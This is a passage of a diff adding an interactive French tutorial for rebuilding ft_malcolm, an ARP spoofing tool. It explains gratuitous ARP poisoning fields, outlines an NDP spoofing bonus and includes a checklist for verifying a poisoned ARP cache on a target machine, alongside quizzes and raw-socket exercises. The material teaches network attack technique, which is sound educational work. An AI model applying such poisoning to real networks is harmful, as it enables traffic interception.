+    <span class="fn">printf</span>(<span class="st">"  opcode     : %s\n"</span>, <span class="fn">ntohs</span>(arp->opcode)==1 ? <span class="st">"request"</span> : <span class="st">"reply"</span>);
+    <span class="fn">printf</span>(<span class="st">"  sender_mac : %02x:%02x:%02x:%02x:%02x:%02x\n"</span>,
+        arp->sender_mac[0], arp->sender_mac[1], arp->sender_mac[2],
+        arp->sender_mac[3], arp->sender_mac[4], arp->sender_mac[5]);
+    <span class="cm">// ... etc</span>
+}</pre>
+</div>
+
+<div class="section">
+  <h3>🧨 Gratuitous ARP</h3>
+  <p>Un <em>Gratuitous ARP</em> est une ARP reply envoyée <strong>sans request préalable</strong>. Tout le LAN qui la reçoit met à jour son cache. C'est le mode "proactif" de l'ARP poisoning.</p>
+  <div class="alert alert-info">
+    Dans ce mode, tu n'attends pas de request. Tu envoies le reply directement avec :<br>
+    <code>eth.dst_mac = FF:FF:FF:FF:FF:FF</code> (broadcast)<br>
+    <code>arp.target_ip = arp.sender_ip</code> (même IP source et cible)<br>
+    <code>arp.target_mac = FF:FF:FF:FF:FF:FF</code>
+  </div>
+  <pre><span class="cm">// Détecte le flag -g dans argv et active le mode gratuitous</span>
+<span class="cm">// Dans ce mode : envoie immédiatement sans écouter</span>
+<span class="kw">if</span> (addrs.gratuitous)
+    <span class="fn">send_gratuitous</span>(sock, &addrs);
+<span class="kw">else</span>
+    <span class="fn">listen_and_reply</span>(sock, &addrs);</pre>
+</div>
+
+<div class="section">
+  <h3>🌐 IPv6 / NDP (Neighbor Discovery Protocol)</h3>
+  <p>IPv6 n'utilise pas ARP mais <strong>NDP</strong>, qui passe par ICMPv6. Le principe est identique : résoudre une adresse L3 (IPv6) en adresse L2 (MAC).</p>
+  <div class="tbl-wrap">
+  <table>
+    <tr><th></th><th>ARP (IPv4)</th><th>NDP (IPv6)</th></tr>
+    <tr><td>Protocole</td><td>ARP (ethertype 0x0806)</td><td>ICMPv6 dans IPv6 (ethertype 0x86DD)</td></tr>
+    <tr><td>Question</td><td>ARP Request (opcode 1)</td><td>Neighbor Solicitation (type 135)</td></tr>
+    <tr><td>Réponse</td><td>ARP Reply (opcode 2)</td><td>Neighbor Advertisement (type 136)</td></tr>
+    <tr><td>Multicast</td><td>Broadcast Ethernet</td><td>Multicast IPv6 solicited-node</td></tr>
+    <tr><td>Socket</td><td>AF_PACKET / ETH_P_ARP</td><td>AF_PACKET / ETH_P_IPV6</td></tr>
+  </table>
+  </div>
+  <p>Pour le bonus NDP, tu dois :</p>
+  <ol>
+    <li>Capter les trames IPv6 (ETH_P_IPV6)</li>
+    <li>Identifier les ICMPv6 type 135 (Neighbor Solicitation)</li>
+    <li>Construire un ICMPv6 type 136 (Neighbor Advertisement) avec ton MAC</li>
+    <li>Calculer le checksum ICMPv6 (pseudo-header IPv6)</li>
+  </ol>
+  <div class="alert alert-warn">⚠️ Le checksum ICMPv6 est obligatoire (contrairement à ARP qui n'en a pas). Implémente <code>checksum16()</code> sur un pseudo-header IPv6.</div>
+</div>
+
+<div class="exo-box">
+  <h4>🎉 Projet complet — Check final</h4>
+  <div class="checklist" id="cl-final">
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Compilation : <code>make</code> sans warning, <code>make clean / fclean / re</code> fonctionnels</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Usage incorrect → message d'erreur clair et exit propre</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Test avec Wireshark : on voit la request captée et le reply forgé</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label"><code>arp -n</code> sur la machine Target montre la nouvelle entrée empoisonnée</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">valgrind : aucune fuite mémoire, aucun accès invalide</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Bonus verbose : <code>./ft_malcolm -v ...</code> affiche les paquets</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Bonus gratuitous : <code>./ft_malcolm -g ...</code> envoie sans attendre</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Bonus NDP : ICMPv6 Neighbor Advertisement avec checksum correct</div></div>
+  </div>
+  <button class="btn btn-secondary" onclick="checkChecklist('cl-final','final-ok')">Check final →</button>
+  <div id="final-ok" style="display:none;margin-top:14px;">
+    <div class="alert alert-ok">🏆 <strong>Félicitations !</strong> Tu as reconstruit ft_malcolm de zéro. Tu comprends maintenant ARP au niveau octet, les raw sockets Linux, et le principe de l'ARP poisoning.</div>
+  </div>
+</div>`;
+}
+
+// ─── Build helpers ────────────────────────────────────────────────────────────
+function buildByteFrame() {
+  let html = `
+<div class="frame-outer">
+  <div class="legend">
+    ${[
+      ['f0','Eth DST MAC'],['f1','Eth SRC MAC'],['f2','Ethertype'],
+      ['f3','hw_type'],['f4','proto_type'],['f5','hw/proto size'],
+      ['f6','opcode'],['f7','ARP sender MAC'],['f8','ARP sender IP'],
+      ['f9','ARP target MAC'],['f10','ARP target IP'],
+    ].map(([cls,label])=>`<div class="legend-i"><div class="legend-dot ${cls}"></div>${label}</div>`).join('')}
+  </div>
+  <div style="margin-bottom:6px;"><div class="frame-seg-label">◀ Ethernet header (14 octets) ▶</div></div>
+  <div class="byte-row" id="byte-row-eth">`;
+
+  FRAME_BYTES.slice(0,14).forEach((b,i)=>{
+    html += `<div class="byte f${b.f}" id="byte${i}" onclick="selectByte(${i})" title="${FIELD_INFO[b.f].name}">
+      <div class="bv">${b.v}</div><div class="bi">${i}</div></div>`;
+  });
+
+  html += `</div>
+  <div style="margin:6px 0 4px;"><div class="frame-seg-label">◀ ARP payload (28 octets) ▶</div></div>
+  <div class="byte-row" id="byte-row-arp">`;
+
+  FRAME_BYTES.slice(14).forEach((b,i)=>{
+    const gi = i+14;
+    html += `<div class="byte f${b.f}" id="byte${gi}" onclick="selectByte(${gi})" title="${FIELD_INFO[b.f].name}">
+      <div class="bv">${b.v}</div><div class="bi">${gi}</div></div>`;
+  });
+
+  html += `</div>
+  <div class="byte-info-box" id="byte-info">
+    <span style="color:var(--muted);font-size:.82rem;">← Clique sur un octet pour voir son rôle</span>
+  </div>
+</div>`;
+  return html;
+}
+
+function buildQuiz(stepIdx) {
+  const qs = QUIZZES[stepIdx];
+  if (!qs) return '';
+  return qs.map((q,qi)=>`
+<div class="quiz-q" id="qq-${stepIdx}-${qi}">
+  <div class="qtext">Q${qi+1}. ${q.q}</div>
+  <div class="options">
+    ${q.opts.map((o,oi)=>`
+    <div class="opt" id="opt-${stepIdx}-${qi}-${oi}" onclick="answerQ(${stepIdx},${qi},${oi})">
+      <div class="opt-radio"></div>
+      <div class="opt-label">${o}</div>
+    </div>`).join('')}
+  </div>
+  <div class="explanation" id="expl-${stepIdx}-${qi}">${q.expl}</div>
+  <div class="q-score" id="score-${stepIdx}-${qi}"></div>
+</div>`).join('');
+}
+
+function buildFilterQuiz() {
+  const pkts = [
+    { id:0, label:'Paquet A', ethertype:'0x0806', opcode:1, tip:'10.0.0.10', match:true },
+    { id:1, label:'Paquet B', ethertype:'0x0800', opcode:1, tip:'10.0.0.10', match:false },
+    { id:2, label:'Paquet C', ethertype:'0x0806', opcode:2, tip:'10.0.0.10', match:false },
+    { id:3, label:'Paquet D', ethertype:'0x0806', opcode:1, tip:'192.168.1.1', match:false },
+    { id:4, label:'Paquet E', ethertype:'0x0806', opcode:1, tip:'10.0.0.10', match:true },
+    { id:5, label:'Paquet F', ethertype:'0x0806', opcode:2, tip:'10.0.0.5',  match:false },
+  ];
+  window._filterPkts = pkts;
+  return pkts.map(p=>`
+<div class="pkt-card" id="fpkt-${p.id}" onclick="togglePkt(${p.id})" data-match="${p.match}">
+  <div class="pkt-title">${p.label}</div>
+  <div class="pkt-field"><span class="pf-key">ethertype</span><span class="pf-val">${p.ethertype}</span></div>
+  <div class="pkt-field"><span class="pf-key">opcode</span><span class="pf-val">${p.opcode} (${p.opcode===1?'request':'reply'})</span></div>
+  <div class="pkt-field"><span class="pf-key">target_ip</span><span class="pf-val">${p.tip}</span></div>
+  <div class="pkt-verdict" id="fv-${p.id}"></div>
+</div>`).join('');
+}
+
+// ─── Interactivity ────────────────────────────────────────────────────────────
+let selectedByte = -1;
+
+window.selectByte = function(idx) {
+  if (selectedByte >= 0) document.getElementById('byte'+selectedByte)?.classList.remove('sel');
+  selectedByte = idx;
+  document.getElementById('byte'+idx)?.classList.add('sel');
+  const b = FRAME_BYTES[idx];
+  const fi = FIELD_INFO[b.f];
+  const box = document.getElementById('byte-info');
+  if (box) box.innerHTML = `
+    <div><span class="bib-field">${fi.name}</span><span class="bib-off"> — octet ${idx} (offset ${idx >= 14 ? idx-14 : idx} ${idx<14?'dans Eth':'dans ARP'})</span></div>
+    <div class="bib-val">Valeur: 0x${b.v}${b.grp ? ' — champ "'+b.grp+'"' : ''}</div>
+    <div class="bib-desc">${fi.desc}</div>`;
+};
+
+// Quiz
+window.answerQ = function(step, qi, oi) {
+  const q = QUIZZES[step][qi];
+  const key = `${step}-${qi}`;
+  if (state.quiz[key] !== undefined) return;
+  const correct = oi === q.correct;
+  state.quiz[key] = correct ? 1 : 0;
+  save();
+
+  document.querySelectorAll(`[id^="opt-${step}-${qi}-"]`).forEach(el => el.classList.add('done'));
+  document.getElementById(`opt-${step}-${qi}-${oi}`).classList.add(correct ? 'correct' : 'wrong');
+  if (!correct) document.getElementById(`opt-${step}-${qi}-${q.correct}`).classList.add('correct');
+  document.getElementById(`expl-${step}-${qi}`).classList.add('show');
+  document.getElementById(`score-${step}-${qi}`).textContent = correct ? '✓ Bonne réponse !' : '✗ Mauvaise réponse — lis l\'explication.';
+
+  checkQuizComplete(step);
+};
+
+function checkQuizComplete(step) {
+  const qs = QUIZZES[step];
+  if (!qs) return;
+  const answered = qs.filter((_,i) => state.quiz[`${step}-${i}`] !== undefined).length;
+  const correct = qs.filter((_,i) => state.quiz[`${step}-${i}`] === 1).length;
+  if (answered < qs.length) return;
+  const unlock = document.getElementById(`unlock${step}`);
+  const score = document.getElementById(`unlock${step}-score`);
+  if (!unlock) return;
+  unlock.style.display = 'block';
+  score.textContent = `Score : ${correct}/${qs.length}`;
+  score.className = `unlock-score ${correct === qs.length ? 'perfect' : 'partial'}`;
+}
+
+window.unlockStep = function(n) {
+  if (n < TOTAL && !state.unlocked[n]) {
+    state.unlocked[n] = true;
+    state.done[n-1] = true;
+    save();
+    renderSidebar();
+    updateProgress();
+  }
+  goStep(n);
+};
+
+// Scenario animation
+let scStep = 0;
+window.animScenario = function() {
+  for (let i = 0; i <= 3; i++) document.getElementById('sc'+i)?.classList.remove('active','done');
+  scStep = 0;
+  document.getElementById('sc0')?.classList.add('active');
+  const run = () => {
+    if (scStep >= 3) return;
+    scStep++;
+    document.getElementById('sc'+(scStep-1))?.classList.add('done');
+    document.getElementById('sc'+scStep)?.classList.add('active');
+    setTimeout(run, 1800);
+  };
+  setTimeout(run, 1200);
+};
+window.resetScenario = function() {
+  scStep = 0;
+  for (let i = 0; i <= 3; i++) {
+    const el = document.getElementById('sc'+i);
+    if (el) { el.classList.remove('active','done'); if(i===0) el.classList.add('active'); }
+  }
+};
+
+// Tabs
+window.switchTab = function(el, paneId) {
+  const parent = el.parentElement;
+  parent.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  el.classList.add('active');
+  const container = parent.parentElement || parent.nextElementSibling?.parentElement;
+  document.querySelectorAll(`[id^="tab-"],[id^="mac-"],[id^="socket-"]`).forEach(p => {
+    if (p.classList.contains('tab-pane')) p.classList.remove('active');
+  });
+  document.getElementById(paneId)?.classList.add('active');
+};
+
+// Live MAC parser
+window.liveMac = function(el) {
+  const val = el.value.trim();
+  const parts = val.split(':');
+  const valid = parts.length === 6 && parts.every(p => /^[0-9a-fA-F]{1,2}$/.test(p));
+  el.className = 'mac-input-big ' + (val.length === 0 ? '' : valid ? 'valid' : 'invalid');
+  const status = document.getElementById('mac-status');
+  if (status) status.textContent = val.length === 0 ? '' : valid ? '✓ Format valide' : '✗ Format invalide';
+  if (status) status.style.color = valid ? 'var(--green)' : 'var(--red)';
+  for (let i = 0; i < 6; i++) {
+    const b = document.getElementById('mb'+i);
+    if (!b) continue;
+    if (valid) {
+      b.textContent = parts[i].toUpperCase().padStart(2,'0');
+      b.className = 'pbyte filled';
+    } else {
+      b.textContent = '--';
+      b.className = 'pbyte';
+    }
+  }
+};
+
+// Live IP parser
+window.liveIP = function(el) {
+  const val = el.value.trim();
+  const parts = val.split('.');
+  const valid = parts.length === 4 && parts.every(p => /^\d+$/.test(p) && parseInt(p) >= 0 && parseInt(p) <= 255);
+  el.className = 'ip-input-big ' + (val.length === 0 ? '' : valid ? 'valid' : 'invalid');
+  const status = document.getElementById('ip-status');
+  if (status) status.textContent = val.length === 0 ? '' : valid ? '✓ Format valide' : '✗ Format invalide';
+  if (status) status.style.color = valid ? 'var(--green)' : 'var(--red)';
+  for (let i = 0; i < 4; i++) {
+    const b = document.getElementById('ib'+i);
+    if (!b) continue;
+    if (valid) {
+      b.textContent = '0x'+parseInt(parts[i]).toString(16).toUpperCase().padStart(2,'0');
+      b.className = 'ipbyte filled';
+    } else {
+      b.textContent = '--';
+      b.className = 'ipbyte';
+    }
+  }
+};
+
+// Blanks exercise (step 4)
+function initBlanks() {
+  const container = document.getElementById('blanks-code');
+  if (!container) return;
+  const blanks = [
+    { label:'famille socket', correct:'AF_PACKET', hint:'Pour Ethernet brut' },
+    { label:'type socket', correct:'SOCK_RAW', hint:'Mode raw' },
+    { label:'commande ioctl', correct:'SIOCGIFINDEX', hint:'Get IF Index' },
+    { label:'champ famille ll', correct:'AF_PACKET', hint:'Même que socket()' },
+    { label:'taille bind', correct:'sizeof(sll)', hint:'Taille de sockaddr_ll' },
+  ];
+  window._blanks = blanks;
+  container.innerHTML = `<code>int sock = socket(<input class="blank-input" id="bl0" placeholder="???">, SOCK_RAW, htons(ETH_P_ARP));\nioctl(sock, <input class="blank-input" id="bl1" placeholder="???">, &ifr);\nsll.sll_family = <input class="blank-input" id="bl2" placeholder="???">\nbind(sock, (struct sockaddr *)&sll, <input class="blank-input" id="bl3" placeholder="???">);</code>`;
+}
+
+window.checkBlanks = function() {
+  const answers = [
+    { el: document.getElementById('bl0'), correct: 'AF_PACKET' },
+    { el: document.getElementById('bl1'), correct: 'SIOCGIFINDEX' },
+    { el: document.getElementById('bl2'), correct: 'AF_PACKET' },
+    { el: document.getElementById('bl3'), correct: 'sizeof(sll)' },
+  ];
+  let score = 0;
+  answers.forEach(a => {
+    if (!a.el) return;
+    const ok = a.el.value.trim() === a.correct;
+    a.el.className = 'blank-input ' + (ok ? 'correct' : 'wrong');
+    if (ok) score++;
+  });
+  const res = document.getElementById('blanks-result');
+  if (res) res.innerHTML = `<div class="alert ${score===answers.length?'alert-ok':'alert-warn'}">${score}/${answers.length} correct${score===answers.length?' — parfait !':'. Réessaie.'}</div>`;
+};
+
+// Filter quiz
+let selectedPkts = new Set();
+window.togglePkt = function(id) {
+  const el = document.getElementById('fpkt-'+id);
+  if (!el || el.classList.contains('answered')) return;
+  if (selectedPkts.has(id)) { selectedPkts.delete(id); el.classList.remove('selected'); }
+  else { selectedPkts.add(id); el.classList.add('selected'); }
+};
+window.checkFilterQuiz = function() {
+  const pkts = window._filterPkts || [];
+  let ok = 0;
+  pkts.forEach(p => {
+    const el = document.getElementById('fpkt-'+p.id);
+    const vdict = document.getElementById('fv-'+p.id);
+    if (!el) return;
+    const selected = selectedPkts.has(p.id);
+    el.classList.add('answered');
+    if (selected === p.match) { el.classList.add('correct-answer'); if(vdict) vdict.textContent='✓'; ok++; }
+    else { el.classList.add('wrong-answer'); if(vdict) vdict.textContent='✗'; }
+  });
+  const res = document.getElementById('filter-result');
+  if (res) {
+    const exp = ['Paquet B : ethertype=0x0800 → IPv4, pas ARP',
+      'Paquet C : opcode=2 → reply, on ne répond pas aux replies',
+      'Paquet D : target_ip=192.168.1.1 ≠ 10.0.0.10',
+      'Paquet F : opcode=2, mauvaise IP'];
+    res.innerHTML = `<div class="alert ${ok===pkts.length?'alert-ok':'alert-warn'}">${ok}/${pkts.length} corrects.<br><small>${ok<pkts.length?exp.join('<br>'):'Tous les filtres sont corrects !'}</small></div>`;
+  }
+};
+
+// Packet builder check
+window.checkPacketBuilder = function() {
+  const fields = [
+    { id:'pb-ethdst', correct:'AA:AA:AA:AA:AA:AA', label:'Eth dst_mac' },
+    { id:'pb-ethsrc', correct:'BB:BB:BB:BB:BB:BB', label:'Eth src_mac' },
+    { id:'pb-opcode', correct:'2', label:'opcode' },
+    { id:'pb-smac', correct:'BB:BB:BB:BB:BB:BB', label:'ARP sender_mac' },
+    { id:'pb-sip', correct:'10.0.0.10', label:'ARP sender_ip' },
+    { id:'pb-tmac', correct:'AA:AA:AA:AA:AA:AA', label:'ARP target_mac' },
+  ];
+  let ok = 0;
+  let errs = [];
+  fields.forEach(f => {
+    const el = document.getElementById(f.id);
+    if (!el) return;
+    const val = el.value.trim().toUpperCase().replace(/-/g,':');
+    const exp = f.correct.toUpperCase();
+    if (val === exp) { el.className='field-input ok'; ok++; }
+    else { el.className='field-input bad'; errs.push(`${f.label}: attendu <code>${f.correct}</code>`); }
+  });
+  const res = document.getElementById('pb-result');
+  if (res) res.innerHTML = `<div class="alert ${ok===fields.length?'alert-ok':'alert-warn'}">${ok}/${fields.length} champs corrects.${errs.length?'<br>'+errs.join('<br>'):'<br>Reply parfaitement forgé !'}</div>`;
+};
+
+// Checklist
+window.toggleCheck = function(el) {
+  el.classList.toggle('checked');
+};
+window.checkChecklist = function(clId, unlockId) {
+  const cl = document.getElementById(clId);
+  if (!cl) return;
+  const items = cl.querySelectorAll('.check-item');
+  const checked = cl.querySelectorAll('.check-item.checked').length;
+  const unlock = document.getElementById(unlockId);
+  if (unlock) unlock.style.display = checked === items.length ? 'block' : 'none';
+  if (checked < items.length) {
+    const existing = cl.nextElementSibling?.nextElementSibling;
+    if (!document.getElementById(clId+'-warn')) {
+      const warn = document.createElement('div');
+      warn.id = clId+'-warn';
+      warn.className = 'alert alert-warn';
+      warn.textContent = `${items.length - checked} point(s) non coché(s). Complète tous les critères avant de continuer.`;
+      cl.after(cl.nextElementSibling, warn);
+    }
+  } else {
+    document.getElementById(clId+'-warn')?.remove();
+  }
+};
+
+// ─── Navigation ───────────────────────────────────────────────────────────────
+const CONTENT_FNS = [
+  contentStep0, contentStep1, contentStep2, contentStep3,
+  contentStep4, contentStep5, contentStep6
+];
+
+function goStep(n) {
+  if (!state.unlocked[n]) return;
+  state.current = n;
+  save();
+  renderSidebar();
+  renderContent(n);
+  window.scrollTo(0,0);
+
+  // Re-init dynamic elements after render
+  setTimeout(() => {
+    initBlanks();
+    if (n === 0) restoreQuiz(0);
+  }, 50);
+}
+
+function restoreQuiz(step) {
+  const qs = QUIZZES[step];
+  if (!qs) return;
+  qs.forEach((q,qi) => {
+    const key = `${step}-${qi}`;
+    if (state.quiz[key] === undefined) return;
+    const correct = q.correct;
+    // Highlight selected and correct
+    const answered = true;
+    document.querySelectorAll(`[id^="opt-${step}-${qi}-"]`).forEach(el => el.classList.add('done'));
+    if (state.quiz[key] === 1) {
+      document.getElementById(`opt-${step}-${qi}-${correct}`)?.classList.add('correct');
+    } else {
+      document.getElementById(`opt-${step}-${qi}-${correct}`)?.classList.add('correct');
+    }
+    document.getElementById(`expl-${step}-${qi}`)?.classList.add('show');
+    const scoreEl = document.getElementById(`score-${step}-${qi}`);
+    if (scoreEl) scoreEl.textContent = state.quiz[key] === 1 ? '✓ Bonne réponse !' : '✗ Mauvaise réponse — lis l\'explication.';
+  });
+  checkQuizComplete(step);
+}
+
+function renderContent(n) {
+  const el = document.getElementById('content');
+  if (el) el.innerHTML = CONTENT_FNS[n]();
+}
+
+function renderSidebar() {
+  const list = document.getElementById('step-list');
+  if (!list) return;
+  list.innerHTML = STEPS.map((s,i)=>`
+<div class="step-item ${i===state.current?'active':''} ${!state.unlocked[i]?'locked':''} ${state.done[i]?'done':''}"
+     onclick="goStep(${i})">
+  <div class="s-icon">${state.done[i]?'✓':state.unlocked[i]?s.icon:'🔒'}</div>
+  <div>
+    <div class="s-title">${i+1}. ${s.title}</div>
+    <div class="s-sub">${s.sub}</div>
+  </div>
+</div>`).join('');
+}
+
+function updateProgress() {
+  const done = state.done.filter(Boolean).length;
+  const pct = Math.round(done / TOTAL * 100);
+  const fill = document.getElementById('prog-fill');
+  const lbl = document.getElementById('prog-pct');
+  if (fill) fill.style.width = pct+'%';
+  if (lbl) lbl.textContent = pct+'%';
+}
+
+// ─── Init ─────────────────────────────────────────────────────────────────────
+renderSidebar();
+updateProgress();
+renderContent(state.current);
+setTimeout(() => {
+  initBlanks();
+  if (state.current === 0) restoreQuiz(0);
+}, 50);
+</script>
+</body>
+</html>
